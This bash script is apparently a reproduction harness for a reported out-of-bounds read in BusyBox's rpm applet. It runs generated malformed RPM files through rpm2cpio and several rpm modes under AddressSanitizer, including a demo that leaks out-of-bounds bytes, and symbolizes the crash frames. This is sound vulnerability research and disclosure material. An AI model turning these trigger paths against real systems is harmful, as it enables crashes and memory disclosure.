#!/usr/bin/env bash
# BBX-001 deterministic reproduction driver.
#
#   BusyBox 1.38.0 archival/rpm.c -- out-of-bounds read via unvalidated
#   header index offsets into the mmap'd store (G.mapsize never consulted).
#
# Usage:
#   ./harnesses/busybox/run_bbx001_repro.sh            # ASan busybox (default)
#   BUSYBOX=/path/to/busybox ./harnesses/busybox/run_bbx001_repro.sh
#
# Inputs are generated on the fly by poc_bbx001_gen_rpm.py and also preserved
# under reports/llm-busybox/crashes_preserved/.

set -u -o pipefail

WSROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BUSYBOX="${BUSYBOX:-$WSROOT/targets/busybox/build_asan/busybox}"
CRASHES="$WSROOT/reports/llm-busybox/crashes_preserved"
WORK="$(mktemp -d)"

export ASAN_OPTIONS="detect_leaks=0:handle_segv=1:abort_on_error=0"
# Keep sanitizer output readable and symbolized from the unstripped binary.
SYMS="$WSROOT/targets/busybox/build_asan/busybox_unstripped"

if [[ ! -x "$BUSYBOX" ]]; then
    echo "ERROR: no busybox binary at $BUSYBOX" >&2
    echo "Build it first (see reports/llm-busybox/findings/BBX-001 section 7)." >&2
    exit 1
fi

echo "== Regenerating PoC inputs =="
python3 "$WSROOT/harnesses/busybox/poc_bbx001_gen_rpm.py" -o "$WORK"
echo

run_case() {
    local title="$1" input="$2"; shift 2
    echo "----------------------------------------------------------------"
    echo "## $title"
    echo "\$ $BUSYBOX $* $input"
    # -i extracts into the cwd, so run every case from a scratch dir.
    ( cd "$WORK" && "$BUSYBOX" "$@" "$input" ) >"$WORK/stdout" 2>"$WORK/stderr"
    local rc=$?
    echo "exit code: $rc   (1 = sanitizer/SEGV abort, 0 = clean exit)"
    if [[ $rc -ne 0 ]]; then
        grep -E 'ERROR: AddressSanitizer|The signal is caused by' "$WORK/stderr" || true
        # Resolve the busybox-internal frames to file:line.
        grep -oE '0x[0-9a-f]+  \([^)]*busybox\+0x[0-9a-f]+\)' "$WORK/stderr" \
            | sed -E 's/.*busybox\+0x([0-9a-f]+)\)/\1/' \
            | while read -r off; do
                  addr2line -f -C -e "$SYMS" "0x$off" 2>/dev/null | paste -d' ' - -
              done | head -6
    fi
    if [[ -s "$WORK/stdout" ]]; then
        echo "--- stdout (leaked out-of-bounds bytes) ---"
        head -c 200 "$WORK/stdout"; echo
    fi
    echo
}

echo "## Trigger paths (each crashes deterministically)"
run_case "Path A: rpm2cpio -> strcmp on OOB pointer (rpm.c:539)" \
         "$WORK/bbx001_pathA_rpm2cpio.rpm" rpm2cpio
run_case "Path B: rpm -qpi -> printf %s on OOB pointer (rpm.c:431)" \
         "$WORK/bbx001_pathB_rpm_qpi.rpm" rpm -qpi
run_case "Path C: rpm -qpl -> rpm_getint OOB read (rpm.c:203)" \
         "$WORK/bbx001_pathC_rpm_qpl.rpm" rpm -qpl
run_case "Path D: rpm -i  -> loop_through_files OOB read" \
         "$WORK/bbx001_pathD_rpm_install.rpm" rpm -i
run_case "All paths in one 224-byte input (rpm2cpio)" \
         "$WORK/bbx001_all_paths.rpm" rpm2cpio

echo "## Information disclosure (no crash: OOB bytes printed to stdout)"
run_case "Leak demo: rpm -qpi reads past the declared 0-byte store" \
         "$WORK/bbx001_leak_declared_store.rpm" rpm -qpi

echo "## Preserved crash inputs ($CRASHES)"
ls -l "$CRASHES" 2>/dev/null || echo "(not present; run: cp $WORK/*.rpm $CRASHES/)"

rm -rf "$WORK"
